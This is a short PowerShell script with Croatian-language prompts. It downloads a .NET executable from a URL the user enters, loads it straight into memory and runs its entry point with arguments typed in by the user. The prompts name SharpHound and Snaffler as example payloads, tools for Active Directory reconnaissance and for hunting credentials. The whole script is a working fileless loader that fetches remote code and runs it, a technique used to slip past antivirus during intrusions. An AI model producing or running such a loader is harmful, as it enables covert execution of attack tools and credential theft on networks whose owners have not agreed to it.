function Invoke-exe
{
    $exeAddr = Read-Host "URL exe fajla koji zelimo loadat"
    $exeBytes = (New-Object Net.WebClient).DownloadData("$exeAddr")

    if ($exeBytes -ne $null)
    {
        $exe = [System.Reflection.Assembly]::Load($exeBytes)

        if ($exe -ne $null)
        {
            $vars = New-Object System.Collections.Generic.List[System.Object]
            
            
            $parametersList = New-Object System.Collections.ArrayList

            # Unosenje switcheva do praznog
            while ($true)
            {
                $switches = Read-Host "Unesi switcheve koje zelis svaki parametar mora biti u zasebno redu(npr. Sharphound -c enter all enter kad si gotov u prazno, ili kod snafflera -s enter -o enter log.txt i onda na kraju enter u praznom redu kada si gotov)"
                if ([string]::IsNullOrWhiteSpace($switches))
                {
                    break  
                }
                else
                {
                    $parametersList.Add($switches)  
                }
            }

            
            $parametersArray = $parametersList.ToArray([string])

            try
            {
                $entryPoint = $exe.EntryPoint

                if ($entryPoint -ne $null)
                {
                    $null = $entryPoint.Invoke($null, @(,$parametersArray))
                }
                else
                {
                    Write-Host "Nije dobro procitao exe entry point"
                }
            }
            catch
            {
                Write-Host "Greška: $_"
            }
        }
        else
        {
            Write-Host "Problem loadanja exe fajla"
        }
    }
    else
    {
        Write-Host "Problem skidanja exe fajla"
    }
}


Invoke-exe
